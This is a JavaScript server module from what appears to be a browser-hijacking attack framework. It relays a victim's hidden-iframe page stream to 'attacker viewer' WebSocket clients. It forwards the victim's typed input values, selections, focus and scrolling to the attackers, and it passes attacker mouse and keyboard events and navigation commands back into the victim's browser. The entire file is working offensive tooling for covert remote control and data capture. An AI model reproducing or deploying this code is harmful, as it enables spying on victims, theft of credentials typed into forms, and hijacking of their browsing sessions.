/**
 * Server-side proxy payload handler.
 *
 * Bidirectional relay between the victim client (hidden iframe DOM stream) and
 * the attacker viewer (interactive browser proxy).
 *
 * Data flows:
 *   Client → server (binary):  JSON-encoded UTF-8 { type: "snapshot"|"delta"|"meta", ... }
 *   Client → server (text):    navigated / value-sync / checked-sync / select-sync /
 *                              scroll-sync / element-scroll-sync / selection-sync / focus-sync
 *   Server → viewer (JSON):    snapshot / delta / meta / navigated / disconnected /
 *                              value-sync / checked-sync / select-sync / scroll-sync /
 *                              element-scroll-sync / selection-sync / focus-sync
 *   Viewer → server (JSON):    { type: "event", data: { nid, event, ... } }
 *                              { type: "navigate", url }
 *                              { type: "viewport", width, height }
 *   Server → client (text):    { type: "event"|"navigate"|"request-sync", ... }
 */
import { broadcast } from "../ws-utils.js";
import {
  forwardToViewers,
  createOnBinary,
  pushToAllViewers,
} from "./_dom-stream-base.js";

export { pushToAllViewers };

// ─── State initialisation ──────────────────────────────────────────────────────

/**
 * Initialize per-client proxy handler state.
 *
 * @param {object} _db - The database layer (unused — proxy state is ephemeral)
 * @param {string} clientId - The client's UUID
 * @param {Function} [storeLog]
 * @returns {{
 *   nodes: Map<string, object>,
 *   meta: object,
 *   viewers: Set<import("ws").WebSocket>,
 *   sendToClient: Function|null,
 *   proxyUrl: string|null,
 *   clientId: string,
 *   storeLog: Function,
 * }}
 */
export function initState(_db, clientId, storeLog = () => {}) {
  return {
    nodes: new Map(),
    meta: {},
    viewers: new Set(),
    /** Populated by onConnect — used to relay viewer events to the victim client. */
    sendToClient: null,
    /** Last-known URL of the victim's proxy iframe. */
    proxyUrl: null,
    clientId,
    storeLog,
  };
}

// ─── Client message handlers ──────────────────────────────────────────────────

/**
 * Handle a binary JSON-encoded frame from the client proxy payload.
 * Decodes and applies the message to local state, then forwards to viewers.
 */
export const onBinary = createOnBinary("proxy");

/**
 * Handle a text (JSON) message from the client proxy payload.
 * Handles state tracking messages and relays form/scroll sync events to viewers.
 *
 * Client → server message types relayed here:
 *   navigated         — victim page URL changed
 *   value-sync        — input .value update (DOM property, not in snapshot/delta)
 *   checked-sync      — checkbox/radio checked state
 *   select-sync       — <select> selectedIndex + value
 *   scroll-sync       — window-level scroll position
 *   element-scroll-sync — per-element scroll (Phase 3)
 *   selection-sync    — text cursor / selection range (Phase 1)
 *   focus-sync        — Tab-driven focus change (Phase 5)
 *
 * @param {{ viewers: Set, proxyUrl: string|null }} state
 * @param {{ type: string, url?: string, nid?: string, [key: string]: unknown }} data
 * @param {Function} _pushToViewers
 */
export function onMessage(state, data, _pushToViewers) {
  if (data.type === "navigated") {
    state.proxyUrl = data.url || null;
    broadcast(state.viewers, JSON.stringify({ type: "navigated", url: state.proxyUrl }));
  } else if (data.type === "value-sync") {
    // Relay input value updates to viewers so they can reflect the current
    // value in the rendered HTML (`.value` is a DOM property, not an attribute,
    // so it never appears in snapshot/delta messages).
    broadcast(state.viewers, JSON.stringify({
      type: "value-sync",
      nid: data.nid,
      value: data.value,
    }));
  } else if (data.type === "checked-sync") {
    // Relay checkbox/radio checked state to viewers for instant UI feedback
    broadcast(state.viewers, JSON.stringify({
      type: "checked-sync",
      nid: data.nid,
      checked: data.checked,
    }));
  } else if (data.type === "select-sync") {
    // Relay select element selection state to viewers
    broadcast(state.viewers, JSON.stringify({
      type: "select-sync",
      nid: data.nid,
      selectedIndex: data.selectedIndex,
      value: data.value,
    }));
  } else if (data.type === "scroll-sync") {
    // Relay victim window scroll position to viewers so they can follow along
    broadcast(state.viewers, JSON.stringify({
      type: "scroll-sync",
      scrollX: data.scrollX,
      scrollY: data.scrollY,
    }));
  } else if (data.type === "element-scroll-sync") {
    // Phase 3: relay per-element scroll position to viewers
    broadcast(state.viewers, JSON.stringify({
      type: "element-scroll-sync",
      nid: data.nid,
      scrollTop: data.scrollTop,
      scrollLeft: data.scrollLeft,
    }));
  } else if (data.type === "selection-sync") {
    // Phase 1: relay text cursor / selection range to viewers
    broadcast(state.viewers, JSON.stringify({
      type: "selection-sync",
      nid: data.nid,
      selectionStart: data.selectionStart,
      selectionEnd: data.selectionEnd,
    }));
  } else if (data.type === "focus-sync") {
    // Phase 5: relay Tab-driven focus changes to viewers
    broadcast(state.viewers, JSON.stringify({
      type: "focus-sync",
      nid: data.nid,
    }));
  }
}

// ─── Connection lifecycle ─────────────────────────────────────────────────────

/**
 * Called after the client has loaded all payloads for this connection.
 * Stores the `sendToClient` callback for later use by viewer event forwarding,
 * and requests a full DOM snapshot on reconnect (server state is ephemeral).
 *
 * @param {{ sendToClient: Function|null, nodes: Map, meta: object }} state
 * @param {{ isReconnect: boolean, sendToClient: Function }} opts
 */
export function onConnect(state, { isReconnect, sendToClient }) {
  state.sendToClient = sendToClient;
  if (isReconnect) {
    sendToClient({ type: "request-sync" });
  }
}

/**
 * Called when the client WebSocket closes.
 * Clears the send callback and notifies viewers that the client is offline.
 *
 * @param {{ sendToClient: Function|null, viewers: Set }} state
 */
export function onDisconnect(state) {
  state.sendToClient = null;
  if (state.viewers.size === 0) return;
  broadcast(state.viewers, JSON.stringify({ type: "disconnected" }));
}

// ─── Viewer WebSocket ─────────────────────────────────────────────────────────

/**
 * Called when an attacker viewer WebSocket connects.
 *
 * Sends the current proxy state as a JSON snapshot (may be empty if the client
 * hasn't connected yet).  Also registers a `message` listener so the viewer can
 * relay interaction events back to the victim client.
 *
 * @param {{ nodes: Map, meta: object, viewers: Set, sendToClient: Function|null, proxyUrl: string|null }} state
 * @param {import("ws").WebSocket} ws
 */
export function onViewerConnect(state, ws) {
  state.viewers.add(ws);

  // Send initial state snapshot
  ws.send(JSON.stringify({
    type: "snapshot",
    nodes: Object.fromEntries(state.nodes),
    meta: state.meta,
    proxyUrl: state.proxyUrl,
  }));

  // If a URL is known, send a navigated message so the viewer shows the URL bar
  if (state.proxyUrl) {
    ws.send(JSON.stringify({ type: "navigated", url: state.proxyUrl }));
  }

  // Relay viewer interaction events to the victim client
  ws.on("message", (raw) => {
    let msg;
    try {
      msg = JSON.parse(raw.toString());
    } catch {
      return;
    }

    if (!state.sendToClient) return; // client disconnected — drop event

    if (msg.type === "event" && msg.data) {
      // Forward mouse/keyboard/input/scroll event to the client
      state.sendToClient({ type: "event", ...msg.data });
    } else if (msg.type === "navigate" && msg.url) {
      // Navigate the victim's proxy iframe to the specified URL
      state.sendToClient({ type: "navigate", url: msg.url });
    } else if (msg.type === "viewport") {
      // Resize the victim's hidden proxy iframe to match the viewer panel
      state.sendToClient({ type: "viewport", width: msg.width, height: msg.height });
    }
  });

  ws.on("close", () => state.viewers.delete(ws));
}
